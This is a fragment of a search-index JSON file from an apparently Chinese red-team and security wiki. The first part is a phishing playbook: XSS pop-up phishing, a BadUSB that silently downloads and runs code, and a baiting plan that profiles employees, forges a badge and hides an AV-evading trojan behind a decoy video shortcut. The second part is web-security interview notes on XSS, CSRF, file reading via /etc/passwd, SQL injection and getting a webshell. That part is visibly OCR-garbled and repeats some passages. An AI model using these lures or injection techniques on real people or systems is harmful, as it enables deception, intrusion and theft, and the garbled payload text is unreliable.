\u80fd\u5f97\u5230\u66f4\u9ad8\u7684\u6743\u9650\uff08\u5982\u6267\u884c\u4e00\u4e9b\u64cd\u4f5c\uff09\u3001\u79c1\u5bc6\u7f51\u9875\u5185\u5bb9\u3001\u4f1a\u8bdd\u548ccookie\u7b49 \u5404\u79cd\u5185\u5bb9\u3002","title":"\u4e00\u3001\u7b80\u8ff0"},{"location":"redteam/%E9%92%93%E9%B1%BC/#xss","text":"\u5728hw\u9700\u6c42\u9762\u524d\uff0c\u6ca1\u67090day\uff0c\u627e\u4e0d\u5230\u5165\u53e3\u70b9\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5b89\u6392\u4e00\u540d\u64c5 \u4e8exss\u6316\u6398\u7684\u961f\u5458\u5229\u7528\u6b64\u79cd\u65b9\u5f0f\u3002 \u4f7f\u7528xss\u5f39\u7a97\u63d0\u793a\u9493\u9c7c\u7684\u65f6\u5019\u9762\u4e34\u7684\u95ee\u9898\uff0c\u5982\u679c\u9c7c\u513f\u5df2\u4e0a\u7ebf\uff0c\u8bbf\u95ee\u8005\u8fd8\u4f1a\u6301 \u7eed\u4e0d\u65ad\u7684\u5f39\u7a97\uff0c\u5bb9\u6613\u5f15\u8d77\u9c7c\u513f\u6000\u7591\uff0c \u6743\u9650\u8bf4\u6ca1\u5c31\u6ca1\u4e86\uff0c\u8fd9\u5e76\u4e0d\u662f\u6211\u4eec\u5e0c\u671b\u770b\u5230\u7684\u7ed3\u679c\u3002 \u53c2\u8003\u6587\u7ae0 XSS\u5b9e\u4f8b\u53ca\u6316\u6398\u65b9\u6cd5 https://www.yuque.com/broken5/blog/vukwsh \u7ea2\u961f\u653b\u9632\u7cfb\u5217\u4e4b\u82b1\u5f0f\u9c7c\u7aff\u9493\u9c7c\u7bc7 https://xz.aliyun.com/t/7958 \u53c2\u8003\u5de5\u5177 XSS-Phishing https://github.com/timwhitez/XSS-Phishing XSS-Fishing2-CS https://github.com/TheKingOfDuck/XSS-Fishing2-CS \u7b56\u7565\u8865\u5145\uff1a\u6b64\u7c7b\u624b\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u8fd0\u7528\u4e8e\u5728\u6316\u5230xss\u65f6\u4f7f\u7528\uff0c\u5728\u6709webshell\u7684\u60c5 \u51b5\u4e0b\uff0c\u8fd8\u53ef\u4ee5\u4fee\u6539\u76f8\u5173\u4ee3\u7801\uff0c\u5d4c\u5165js\u6587\u4ef6\u8fdb\u884c\u5bf9\u4e2a\u4ebaPC\u7684\u9493\u9c7c\uff0c\u4f8b\u5982\u67d0\u7c7b \u6709\u8fd0\u7ef4\u7ef4\u62a4\u7684\u7ad9\u70b9\uff0c\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u9493\u8fd0\u7ef4PC\uff0c\u8fd0\u7ef4PC\u4e0a\u7684\u4e1c\u897f\u53ef\u6bd4\u81ea\u5df1\u6253 server\u673a\u6162\u6162\u63a2\u7d22\u6765\u5f97\u8fc5\u901f\u900f\u5f7b\u3002","title":"\u4e8c\u3001XSS\u9493\u9c7c"},{"location":"redteam/%E9%92%93%E9%B1%BC/#0x03-badusb","text":"","title":"0x03 BadUsb"},{"location":"redteam/%E9%92%93%E9%B1%BC/#_4","text":"BadUSB\u662f\u5229\u7528\u4f2a\u9020HID\u8bbe\u5907\u6267\u884c\u653b\u51fb\u8f7d\u8377\u7684\u4e00\u79cd\u653b\u51fb\u65b9\u5f0f\u3002HID\u8bbe\u5907\u901a\u5e38 \u6307\u7684\u5c31\u662f\u952e\u76d8\u9f20\u6807\u7b49\u4e0e\u4eba\u4ea4\u4e92\u7684\u8bbe\u5907\uff0c\u7528\u6237\u63d2\u5165BadUSB\uff0c\u5c31\u4f1a\u81ea\u52a8\u6267\u884c \u9884\u7f6e\u5728\u56fa\u4ef6\u4e2d\u7684\u6076\u610f\u4ee3\u7801\u3002 Bad\ufffeUsb\u63d2\u5165\u540e\uff0c\u4f1a\u6a21\u62df\u952e\u76d8\u9f20\u6807\u5bf9\u7535\u8111\u8fdb\u884c\u64cd\u4f5c\uff0c\u901a\u8fc7\u8fd9\u4e9b\u64cd\u4f5c\u6253\u5f00\u7535\u8111\u7684\u547d \u4ee4\u7ec8\u7aef\uff0c\u5e76\u6267\u884c\u4e00\u6761\u547d\u4ee4\uff0c\u8fd9\u6761\u547d\u4ee4\u5c06\u4ece\u6307\u5b9a\u7f51\u5740\u4e0b\u8f7d\u5176\u4ed6\u4ee3\u7801\u5e76\u4e8e\u540e\u53f0 \u9759\u9ed8\u8fd0\u884c\u3002\u8fd9\u4e9b\u4ee3\u7801\u529f\u80fd\u5305\u62ec\uff1a\u7a83\u53d6\u4fe1\u606f\u3001\u53cd\u5f39shell\u3001\u53d1\u9001\u90ae\u4ef6\u7b49\uff0c\u4ece\u800c \u5b9e\u73b0\u63a7\u5236\u76ee\u6807\u673a\u6216\u8005\u7a83\u53d6\u4fe1\u606f\u7684\u76ee\u7684\u3002","title":"\u4e00\u3001\u7b80\u8ff0"},{"location":"redteam/%E9%92%93%E9%B1%BC/#_5","text":"\u8be6\u7ec6\u7684\u5236\u4f5c\u64cd\u4f5c\u8fc7\u7a0b\u4e0d\u518d\u7d2f\u8ff0\uff0c\u53c2\u8003\u4ee5\u4e0b\u6587\u7ae0\u3002 BadUSB\u7b80\u5355\u514d\u6740\u4e00\u79d2\u4e0a\u7ebfCobaltStrike https://mp.weixin.qq.com/s/UROx1fJOmMVbmH_-UasFEQ Badusb\u521d\u8bc6 https://xz.aliyun.com/t/6435 BasUSB\u5b9e\u73b0\u540e\u53f0\u9759\u9ed8\u6267\u884c\u4e0a\u7ebfCobaltStrike https://mp.weixin.qq.com/s/pH9hcKGQHIRMxU3uDN3JUw \u7b56\u7565\u8865\u5145 1\u3001\u6478\u7d22\u5458\u5de5\u4fe1\u606f\uff0c\u4f8b\u5982\u67d0\u4e4e\uff0c\u67d0\u76f4\u8058\uff0c\u5c3d\u4e00\u5207\u4fe1\u606f\u6536\u96c6\u624b\u6bb5\uff0c\u91c7\u96c6\u5458\u5de5\u4fe1 \u606f\uff08\u5973\u6027\u5458\u5de5\u4e3a\u5b9c\uff09\u3002 2\u3001\u67d0\u5b9d\u641c\u7d22\u8d2d\u4e70\u8be5\u53f8\u5458\u5de5\u5de5\u724c\uff0c\u5e76\u5236\u4f5c\u3002 3\u3001\u5236\u4f5cbadusb\uff0c\u5e76\u5c06U\u76d8\u8d34\u4e0a\u4e00\u4e9b\u7b26\u5408\u5973\u6027\u5ba1\u7f8e\u7684\u8d34\u7eb8\u4e4b\u7c7b\uff0c\u5c06\u5176\u6302\u8f7d\u5de5 \u724c\u4e0a\u3002 4\u3001\u4e3a\u4e86\u4fdd\u9669\u8d77\u89c1\uff0c\u8bbe\u7f6e\u7b2c\u4e8c\u4e2a\u5907\u7528\u65b9\u6848\uff0c\u4f8b\u5982\uff0c\u5229\u7528\u5feb\u6377\u65b9\u5f0f\u7684\u624b\u6cd5\uff0c\u627e \u4e00\u5f20\u7537\u5973\u66a7\u6627\u7684\u56fe\u7247\u7528\u6765\u5236\u4f5c\u5feb\u6377\u65b9\u5f0f\u7684\u56fe\u6807\uff0c\u540d\u5b57\u53d6\u540d\u4e3a\u201c\u521d\u590f\u4e4b\u591c.mp4 \u201d\uff0c\u5c06\u8be5\u6587\u4ef6\u653e\u5728\u540d\u4e3a\u201c\u751c\u871c\u65f6\u523b\u201d\u6587\u4ef6\u5939\u4e0b\uff0c\u6587\u4ef6\u5939\u4e0b\u518d\u653e\u51e0\u5f20\u7f51\u7edc\u201c\u8336\u56fe\u201d\uff0c \u4e0d\u5e26\u8138\u7684\u90a3\u79cd\uff0c\u518d\u8bbe\u7f6e\u4e00\u4e2a\u9690\u85cf\u5c5e\u6027\u7684\u6587\u4ef6\u5939\uff0c\u91cc\u9762\u5b58\u653e\u81ea\u5df1\u7684\u514d\u6740\u9a6c\u3002 Attrib +s +a +h +r \u547d\u4ee4\u4ecb\u7ecd\uff1a \u663e\u793a\u6216\u66f4\u6539\u6587\u4ef6\u5c5e\u6027ATTRIB[+R|-R][+A|-A][+S|-S][+H|- H][[drive:][path]filename][/S[/D]]+\u8bbe\u7f6e\u5c5e\u6027\uff1b- \u6e05\u9664\u5c5e\u6027\uff1bR\u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027\uff1bA\u5b58\u6863\u6587\u4ef6\u5c5e\u6027\uff1bS\u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\uff1bH\u9690\u85cf\u6587\u4ef6\u5c5e\u6027\uff1b \u73b0\u5728\uff0c\u6211\u4eec\u628a\u8fd9\u4e2aU\u76d8+\u5de5\u724c\u4f2a\u9020\u6210\u4e86\u67d0\u4e00\u4e2a\u5973\u6027\u5458\u5de5\u7684\u7269\u54c1\uff0c\u5e76\u5728\u5176\u4e2d\u5b58 \u653e\u4e86\u4e00\u4e9b\u4ee4\u4eba\u611f\u5174\u8da3\u7684\u4e1c\u897f\uff0c\u60f3\u8c61\u4e00\u4e0b\uff0c\u5982\u679c\u5c06\u5176\u6295\u653e\u5728\u8be5\u53f8\u67d0\u4e00\u4e2a\u5730\u65b9 \uff0c\u88ab\u5458\u5de5\u62fe\u9057\uff0c\u4f1a\u51fa\u73b0\u4ec0\u4e48\u6837\u7684\u60c5\u51b5\u3002\u3002\u3002 \u53c2\u8003\u94fe\u63a5 \u65b0\u578b\u8fdc\u63a7\u6728\u9a6c\u4e0a\u6f14\u79fb\u5f62\u6362\u5f71\u5927\u6cd5 https://www.freebuf.com/articles/system/138164.html Windows\u768412\u79cd\u5feb\u6377\u65b9\u5f0f https://www.cnblogs.com/bkclover/p/4228441.html \u7ea2\u961f\u6d3b\u52a8\u4e4bLnk\u6837\u672c\u8f7d\u8377\u7bc7 https://mp.weixin.qq.com/s/ZbtGJAT-SyZ50LRNOCg14w","title":"\u4e8c\u3001\u64cd\u4f5c"},{"location":"redteam/%E9%92%93%E9%B1%BC/#0x04","text":"\u4e00\u3001\u9644\u4ef6\u643a\u9a6c \u4e8c\u3001\u6346\u7ed1\u643a\u9a6c \u8bf4\u660e\uff1a\u4ee5\u4e0a\u6240\u6f14\u793a\u7684\u4e24\u79cd\u5b9e\u73b0\u5747\u662f\u4ece\u672c\u6587\u6240\u5217\u4e3e\u7684\u5185\u5bb9\u7ecf\u8fc7\u7ec4\u5408\u4fee\u6539\u6d4b\u8bd5 \u800c\u6210\uff0c\u4e0d\u5177\u6709\u591a\u5c11\u6280\u672f\u542b\u91cf\u3002","title":"0x04 \u5c0f\u6280\u5de7\u6f14\u793a"},{"location":"redteam/%E9%92%93%E9%B1%BC/#0x05","text":"\u793e \u5de5 \u51e0 \u4e2a \u57fa \u7840 \u70b9 \uff1a 1 \u3001 \u4fe1 \u606f \u6536 \u96c6 2 \u3001 \u7ed8 \u5236 \u4eba \u7269 \u753b \u50cf 3\u3001\u6307\u5b9a\u6218\u672f\u3002\u5728\u5b9e\u6218\u4e2d\u5e94\u5c06\u793e\u5de5\u9493\u9c7c\u878d\u5165\u6e17\u900f\u7684\u5404\u4e2a\u73af\u8282\u3002\u9ad8\u8d28\u91cf\u7684\u9488\u5bf9 \u67d0\u7c7b\u4e2a\u4f53\u9493\u9c7c\u5f80\u5f80\u6bd4\u6279\u91cf\u6d77\u9493\u7684\u6548\u679c\u6765\u7684\u66f4\u51fa\u8272\u3002 \u4e00\u7bc7\u7cbe\u5f69\u7684\u5b9e\u4f8b\u793e\u5de5 \u53cd\u8bc8\u6848\u4f8b|\u8bc8\u9a97\u56e2\u4f19\u5192\u5145\u9886\u5bfc\u5f00\u53e3\u5c31\u898198w https://mp.weixin.qq.com/s/KL6O6fqeKWue81VZTiYAFA \u9644\u4e0a\u53f2\u4e0a\u6700\u52a8\u542c\u6700\u7ecf\u5178\u7684\u539f\u7248\u97f3\u9891\uff1a\u6709\u4e3b\u673a\u4e0a\u7ebf\u8bf7\u6ce8\u610f \u7cbe\u9009\u7559\u8a00 \u7528\u6237\u8bbe\u7f6e\u4e0d\u4e0b\u8f7d\u8bc4\u8bba","title":"0x05 \u6700\u540e"},{"location":"%E5%AE%89%E5%85%A8wiki/CMS%E5%AE%89%E5%85%A8/","text":"\u8fd9\u8282\u4e1c\u897f\u76f4\u63a5\u53c2\u8003\u7f51\u4e0a\u7684\u6709\u70b9\u591a\uff0c\u4e14\u7248\u672c\u4e0d\u9002\u7528","title":"cms\u5b89\u5168"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/","text":"\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e \u00b6 xss\u6f0f\u6d1e \u00b6 \u53cd\u5c04\u3001dom\u3001\u5b58\u50a8 \u76d7\u53d6\u7528\u6237Cookie\u3001\u672a\u6388\u6743\u64cd\u4f5c\u3001\u4fee\u6539DOM\u3001\u5237\u6d6e\u7a97\u5e7f\u544a\u3001\u53d1\u52a8XSS\u8815\u866b\u653b\u51fb\u3001 \u52ab\u6301\u7528\u6237\u884c\u4e3a\uff0c\u8fdb\u4e00\u6b65\u6e17\u900f\u5185\u7f51\u3002 \u9632\u62a4 1)\u5c06HTML\u5143\u7d20\u5185\u5bb9\u3001\u5c5e\u6027\u4ee5\u53caURL\u8bf7\u6c42\u53c2\u6570\u3001CSS \u503c\u8fdb\u884c\u7f16\u7801 2)\u5f53\u7f16\u7801\u5f71\u54cd\u4e1a\u52a1\u65f6\uff0c\u4f7f\u7528\u767d\u540d\u5355\u89c4\u5219\u8fdb\u884c\u68c0\u6d4b\u548c\u8fc7\u6ee4 3)\u4f7f\u7528W3C\u63d0\u51fa\u7684CSP (Content Security Policy, \u5185\u5bb9\u5b89\u5168\u7b56\u7565)\uff0c\u5b9a\u4e49\u57df\u540d\u767d\u540d\u5355 4)\u8bbe\u7f6ecookie\u7684httponly\u5c5e\u6027 csrf \u00b6 1)\u6700\u5bb9\u6613\u5b9e\u73b0\u7684\u662fGet\u8bf7\u6c42\uff0c\u4e00\u822c\u8fdb\u5165\u9ed1\u5ba2\u7f51\u7ad9\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6eimg\u7684src\u5c5e \u6027\u6765\u81ea\u52a8\u53d1\u8d77\u8bf7\u6c42 2)\u5728\u9ed1\u5ba2\u7684\u7f51\u7ad9\u4e2d\uff0c\u6784\u9020\u9690\u85cf\u8868\u5355\u6765\u81ea\u52a8\u53d1\u8d77Post\u8bf7\u6c42 3)\u901a\u8fc7\u5f15\u8bf1\u94fe\u63a5\u8bf1\u60d1\u7528\u6237\u70b9\u51fb\u89e6\u53d1\u8bf7\u6c42\uff0c\u5229\u7528a\u6807\u7b7e\u7684href \u9632\u62a4 1)\u9488\u5bf9\u5b9e\u9645\u60c5\u51b5\uff0c\u8bbe\u7f6e\u5173\u952eCookie \u7684SameSite\u5c5e\u6027\u4e3aStrict \u6216Lax 2)\u670d\u52a1\u7aef\u9a8c\u8bc1\u8bf7\u6c42\u6765\u6e90\u7ad9\u70b9(Referer\u3001Origin) 3)\u4f7f\u7528CSRFToken,\u670d\u52a1\u7aef\u968f\u673a\u751f\u6210\u8fd4\u56de\u7ed9\u6d4f\u89c8\u5668\u7684Token,\u6bcf-\u6b21\u8bf7\u6c42\u90fd\u4f1a\u643a\u5e26\u4e0d\u540c\u7684CSRF Token 4)\u52a0\u5165\u4e8c\u6b21\u9a8c\u8bc1 45\u3001token\u548creferer\u505a\u6a2a\u5411\u5bf9\u6bd4\uff0c\u8c01\u5b89\u5168\u7b49\u7ea7\u9ad8 token\u5b89\u5168\u7b49\u7ea7\u66f4\u9ad8\uff0c\u56e0\u4e3a\u5e76\u4e0d\u662f\u4efb\u4f55\u670d\u52a1\u5668\u90fd\u53ef\u4ee5\u53d6\u5f97referer, \u5982\u679c\u4eceHTTPS \u8df3\u5230HTTP,\u4e5f\u4e0d\u4f1a\u53d1\u9001referer\u3002\u5e76\u4e14FLASH\u4e00\u4e9b\u7248\u672c\u4e2d\u53ef\u4ee5\u81ea\u5b9a\u4e49referer\u3002\u4f46 \u662ftoken\u7684\u8bdd\uff0c\u8981\u4fdd\u8bc1\u5176\u8db3\u591f\u968f\u673a\u4e14\u4e0d\u53ef\u6cc4\u9732\u3002 46\u3001\u5bf9referer\u7684\u9a8c\u8bc1\uff0c\u4ece\u4ec0\u4e48\u89d2\u5ea6\u53bb\u505a?\u5982\u679c\u505a\uff0c\u600e\u4e48\u675c\u7edd\u95ee\u9898 \u5bf9header\u4e2d\u7684referer\u7684\u9a8c\u8bc1\uff0c- \u4e2a\u662f\u7a7areferer,\u4e00\u4e2a\u662freferer\u8fc7\u6ee4\u6216\u8005\u68c0\u6d4b \u4e0d\u5b8c\u5584\u3002\u4e3a\u4e86\u675c\u7edd\u8fd9\u79cd\u95ee\u9898\uff0c\u5728\u9a8c\u8bc1\u7684\u767d\u540d\u5355\u4e2d\uff0c\u6b63\u5219\u89c4\u5219\u5e94\u5f53\u5199\u5b8c\u5584\u300299 47\u3001\u9488\u5bf9token\u653b\u51fb\uff0c\u4f60\u4f1a\u5bf9token\u7684\u54ea\u65b9\u9762\u8fdb\u884c\u6d4b\u8bd5 \u9488\u5bf9token\u7684\u653b\u51fb\uff0c\u4e00\u662f\u5bf9\u5b83\u672c \u8eab\u7684\u653b\u51fb\uff0c\u91cd\u653e\u6d4b\u8bd5\u4e00\u6b21\u6027\u3001 \u5206\u6790\u52a0\u5bc6\u89c4\u5219\u3001\u6821 \u9a8c\u65b9\u5f0f\u662f\u5426\u6b63\u786e\u7b49\uff0c\u4e8c\u662f\u7ed3\u5408\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\u5bf9\u5b83\u7684\u83b7\u53d6\uff0c\u7ed3\u5408\u7740\u53d1\u8d77\u7ec4\u5408\u653b\u51fb\u3002 \u4fe1\u606f\u6cc4\u9732\u6709\u53ef\u80fd\u662f\u7f13\u5b58\u3001\u65e5\u5fd7\u3001get,\u4e5f\u6709\u53ef\u80fd\u662f\u5229\u7528\u8de8\u7ad9\u3002\u5f88\u591a\u8df3\u8f6c\u767b\u5f55\u7684\u90fd \u4f9d\u8d56token,\u6709\u4e00\u4e2a\u8df3\u8f6c\u6f0f\u6d1e\u52a0\u53cd\u5c04\u578b\u8de8\u7ad9\u5c31\u53ef\u4ee5\u7ec4\u5408\u6210\u767b\u5f55\u52ab\u6301\u4e86\u3002 \u53e6\u5916\u4e5f\u53ef\u4ee5\u7ed3\u5408\u7740\u5176\u5b83\u4e1a\u52a1\u6765\u63cf\u8ff0token\u7684\u5b89\u5168\u6027\u53ca\u8bbe\u8ba1\u4e0d\u597d\u600e\u4e48\u88ab\u7ed5\u8fc7\u6bd4\u5982 \u62a2\u7ea2\u5305\u4e1a\u52a1\u4e4b\u7c7b\u7684\u3002 \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u00b6 \u5229\u7528\u6761\u4ef6:\u5b58\u5728\u8bfb\u6587\u4ef6\u7684\u51fd\u6570;\u8bfb\u53d6\u6587\u4ef6\u7684\u8def\u5f84\u7528\u6237\u53ef\u63a7\u4e14\u672a\u6821\u9a8c\u6216\u6821\u9a8c\u4e0d\u4e25; \u8f93\u51fa\u4e86\u6587\u4ef6\u5185\u5bb9\u3002 \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u548c\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6709\u7740\u76f8\u4f3c\u7684\u5730\u65b9:\u5c31\u662f\u90fd\u9700\u8981\u8def\u5f84\uff0c\u4f8b\u5982 index.php?f-file:///etc/ passwd, index.php?f= ./index.php 32\u3001\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\u7684\u4fee\u590d\u65b9\u6848 1)\u8fc7\u6ee4\u7528\u6237\u6570\u636e\uff0c\u5982\"/\"\uff0c \u201c*.\"\u7b49\u7279\u6b8a\u5b57\u7b26 2)\u66f4\u65b0\u4e2d\u95f4\u4ef6 3)\u8981\u4e0b\u8f7d\u7684\u6587\u4ef6\u5730\u5740\u4fdd\u5b58\u81f3\u6570\u636e\u5e93\u4e2d 4)\u6587\u4ef6\u8def\u5f84\u4fdd\u5b58\u81f3\u6570\u636e\u5e93\uff0c\u8ba9\u7528\u6237\u63d0\u4ea4\u6587\u4ef6\u5bf9\u5e94ID\u6216session\u4e0b\u8f7d\u6587\u4ef6 5)\u7528\u6237\u4e0b\u8f7d\u6587\u4ef6\u4e4b\u524d\u9700\u8981\u8fdb\u884c\u6743\u9650\u5224\u65ad 6)\u6587\u4ef6\u653e\u5728web\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u7684\u76ee\u5f55\u4e0b 7)\u4e0d\u5141\u8bb8\u63d0\u4f9b\u76ee\u5f55\u904d\u5386\u670d\u52a1 8)\u516c\u5f00\u6587\u4ef6\u53ef\u653e\u7f6e\u5728weD\u5e94\u7528\u7a0b\u5e8f\u4e0b\u8f7d\u76ee\u5f55\u4e2d\u901a\u8fc7\u94fe\u63a5\u8fdb\u884c\u4e0b\u8f7d \u77ed\u4fe1\u91cd\u7f6e\u5bc6\u7801 \u00b6 \u7ed5\u8fc7\u65b9\u5f0f SQL\u6ce8\u5165 \u00b6 \u6309\u6570\u636e\u7684\u4f20\u9012\u65b9\u5f0f\u53ef\u4ee5\u5206\u4e3a: get\u6ce8\u5165\u3001post\u6ce8\u5165\u3001cookie \u6ce8\u5165 \u6839\u636e\u6ce8\u5165\u70b9\u7c7b\u578b\u5206\u7c7b:\u6570\u5b57\u578b\u3001\u5b57\u7b26\u578b \u6839\u636e\u6267\u884c\u6548\u679c\u5206\u7c7b:\u6709\u56de\u663e\u7684\u6ce8\u5165\u3001\u76f2\u6ce8\u3001\u62a5\u9519\u6ce8\u5165\u3001\u5806\u53e0\u6ce8\u5165\u3001\u5bbd\u5b57\u8282\u6ce8\u5165 \u64cd\u4f5c\uff0c\u4ea4\u6613\u6216\u4e1a\u52a1\u6b65\u9aa4\u7ed5\u8fc7\u3002 \u5b57\u7b26\u88ab\u8f6c\u4e49 \u5bbd\u5b57\u8282\uff0chex\u7f16\u7801 15\u3001\u4ee3\u7801\u6267\u884c\uff0c\u6587\u4ef6\u8bfb\u53d6\uff0c\u547d\u4ee4\u6267\u884c\u7684\u51fd\u6570\u90fd\u6709\u54ea\u4e9b 1)\u4ee3\u7801\u6267\u884c: eval,preg_ replacc+/e,assert,call user. func,call user func arry,create function 2)\u6587\u4ef6\u8bfb\u53d6: file get .contents0,highlight file0,fopen0.readfle0.fread0.fgetss), fgets().parse in_ file(),show_ source),file() 3)\u547d\u4ee4\u6267\u884c: system(, exec(), shell exec0, passthru() .pcntl. exec(. popen),proc open) \u9632\u62a4 \u53c2\u6570\u5316\u67e5\u8be2 18\u3001\u5bbd\u5b57\u8282\u6ce8\u5165\u4ea7\u751f\u539f\u7406\u4ee5\u53ca\u6839\u672c\u539f\u56e0 1)\u4ea7\u751f\u539f\u7406:\u5728\u6570\u636e\u5e93\u4f7f\u7528\u4e86\u5bbd\u5b57\u7b26\u96c6\u800cWEB\u4e2d\u6ca1\u8003\u8651\u8fd9\u4e2a\u95ee\u9898\u7684\u60c5\u51b5\u4e0b\uff0c\u7531 \u4e8e0XBF27\u662f\u4e24\u4e2a\u5b57\u7b26\uff0c\u5728PHP\u4e2dadcslash\u548cmagic _quotes. gpc\u5f00\u542f\u65f6\uff0c\u4f1a\u5bf9 0x27\u5355\u5f15\u53f7\u8fdb\u884c\u8f6c\u4e49\uff0c\u56e0\u6b640xbf27\u4f1a\u53d8\u62100xbf5c27\u3002 \u800c\u6570\u636e\u8fdb\u5165\u6570\u636e\u5e93\u4e2d\u65f6\uff0c\u7531\u4e8e0XBF5C\u662f\u4e00-\u4e2a\u53e6\u5916\u7684\u5b57\u7b26\uff0c\u56e0\u6b64\\\u8f6c\u4e49\u7b26\u53f7\u4f1a\u88ab \u524d\u9762\u7684bf\u5e26\u7740\"\u5403\u6389\"\uff0c\u5355\u5f15\u53f7\u7531\u6b64\u9003\u9038\u51fa\u6765\u53ef\u4ee5\u7528\u6765\u95ed\u5408\u8bed\u53e5\u3002 2)\u6839\u672c\u539f\u56e0: character. set _lient(\u5ba2 \u6237\u7aef\u7684\u5b57\u7b26\u96c6)\u548ccharacter. set connection(\u8fde\u63a5\u5c42\u7684\u5b57\u7b26 \u96c6)\u4e0d\u540c,\u6216\u8f6c\u6362\u51fd\u6570\u5982\uff0ciconv\u3001 mb. convert. encoding\u4f7f\u7528\u4e0d\u5f53\u3002 \u89e3\u51b3\u529e\u6cd5:\u7edf\u4e00\u6570\u636e\u5e93\u3001Web\u5e94\u7528\u3001\u64cd\u4f5c\u7cfb\u7edf\u6240\u4f7f\u7528\u7684\u5b57\u7b26\u96c6\uff0c\u907f\u514d\u89e3\u6790\u4ea7 \u751f\u5dee\u5f02\uff0c\u6700\u597d\u90fd\u8bbe\u7f6e\u4e3aU1F-8\u3002\u6216\u5bf9\u6570\u636e\u8fdb\u884c\u6b62\u786e\u7684\u8f6c\u4e49\uff0c\u5982 mysql real escape string +mysql set charset\u7684\u4f7f\u7528\u3002 19\u3001mysql \u7684\u7f51\u7ad9\u6ce8\u51655.0\u4ee5\u4e0a\u548c5.0\u4ee5\u4e0b\u6709\u4ec0\u4e48\u533a\u522b 5.0\u4ee5\u4e0b\u6ca1\u6709information. schema\u8fd9\u4e2a\u7cfb\u7edf\u8868\uff0c\u65e0\u6cd5\u5217\u8868\u540d\u7b49.\u53ea\u80fd\u66b4\u529b\u8dd1\u8868\u540d: 5.0\u4ee5\u4e0b\u662f\u591a\u7528\u6237\u5355\u64cd\u4f5c\uff0c5.0\u4ee5_ \u4e0a\u662f\u591a\u7528\u6237\u591a\u64cd\u4f5c\u3002 30\u3001Sqlmap \u5e38\u7528\u53c2\u6570 -u (\u6307\u5b9aur) \u300c(\u8bfb\u53d6\u9700\u8981\u6ce8\u5165\u7684post\u8bf7\u6c42\u7684\u6587\u672c) -m (\u6279\u91cf\u8dd1get\u6ce8\u5165) -P (\u6307\u5b9a\u6ce8\u5165\u53c2\u6570) -current-do: (\u83b7\u53d6\u5f53\u524d\u6570\u636e\u5e93) -table (\u679a\u4e3e\u6570\u636e\u5e93\u8868) \u201c-amper (\u4f7f\u7528\u8fc7 waf\u811a\u672c) 36\u3001\u53d1\u73b0demo.Jsp?uid=110\u6ce8\u5165\u70b9\uff0c\u4f60\u6709\u54ea\u51e0\u79cd\u601d\u8def\u83b7\u53d6webshell,\u54ea\u79cd\u662f \u4f18\u9009 \u6709\u5199\u5165\u6743\u9650\u7684\uff0c\u6784\u9020\u8054\u5408\u67e5\u8be2\u8bed\u53e5\u4f7f\u7528using INTO OUTFILE,\u53ef\u4ee5\u5c06\u67e5\u6d35\u7684\u8f93\u51fa \u91cd\u5b9a\u5411\u5230\u7cfb\u7edf\u7684\u6587\u4ef6\u4e2d\uff0c\u8fd9\u6837\u53bb\u5199\u5165WeEShell\u4f7f\u7528sqlmap - os-shell\u539f\u7406\u548c\u4e0a \u9762\u4e00\u79cd\u76f8\u540c\uff0c\u6765\u76f4\u63a5\u83b7\u5f97\u4e00\u4e2aShell, \u8fd9\u6837\u6548\u7387\u66f4\u9ad8\u3002 \u901a\u8fc7\u6784\u9020\u8054\u5408\u67e5\u8be2\u8bed\u53e5\u5f97\u5230\u7f51\u7ad9\u7ba1\u7406\u5458\u7684\u8d26\u6237\u548c\u5bc6\u7801\uff0c\u7136\u540e\u626b\u540e\u53f0\u767b\u5f55\u540e\u53f0\uff0c\u518d \u5728\u540e\u53f0\u901a\u8fc7\u6539\u5305\u4e0a\u4f20\u7b49\u65b9\u6cd5\u4e0a\u4f20Shell\u3002 7)\u4e0d\u5141\u8bb8\u63d0\u4f9b\u76ee\u5f55\u904d\u5386\u670d\u52a1 8)\u516c\u5f00\u6587\u4ef6\u53ef\u653e\u7f6e\u5728weD\u5e94\u7528\u7a0b\u5e8f\u4e0b\u8f7d\u76ee\u5f55\u4e2d\u901a\u8fc7\u94fe\u63a5\u8fdb\u884c\u4e0b\u8f7d 41\u3001SQL\u91cc\u9762\u53ea\u6709update\u600e\u4e48\u5229\u7528 \u5148\u7406\u89e3\u8fd9\u53e5SQL: UPDATE user sET password='MD5( password)\uff0c nomepage= homepage' WHERE id='id\" \u5982\u679c\u6b64SQL\u88ab\u4fee\u6539\u6210\u4ee5\u4e0b\u5f62\u5f0f\uff0c\u5c31\u5b9e\u73b0\u4e86\u6ce8\u5165\u3002 1)\u4fee\u6539homepage\u503c\u4e3ahtpper. uereve=*3 \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET paswordra'mypass homepage=' ht:xx net', userlevel='3' WHERE id=' homepage' WHERE id='id\" \u5982\u679c\u6b64SQL\u88ab\u4fee\u6539\u6210\u4ee5\u4e0b\u5f62\u5f0f\uff0c\u5c31\u5b9e\u73b0\u4e86\u6ce8\u5165\u3002 1)\u4fee\u6539homepage\u503c\u4e3ahtpper. uereve=*3 \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET paswordra'mypass homepage=' ht:xx net', userlevel='3' WHERE id=' id\" userlevel\u4e3a\u7528\u6237\u7ea7\u522b 2)\u4fee\u6539password\u503c\u4e3amypass)' WHERE username= admin'# \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET password= \"MD5(mypass)' WHERE username= 'admin'#), homepage='id\" userlevel\u4e3a\u7528\u6237\u7ea7\u522b 2)\u4fee\u6539password\u503c\u4e3amypass)' WHERE username= admin'# \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET password= \"MD5(mypass)' WHERE username= 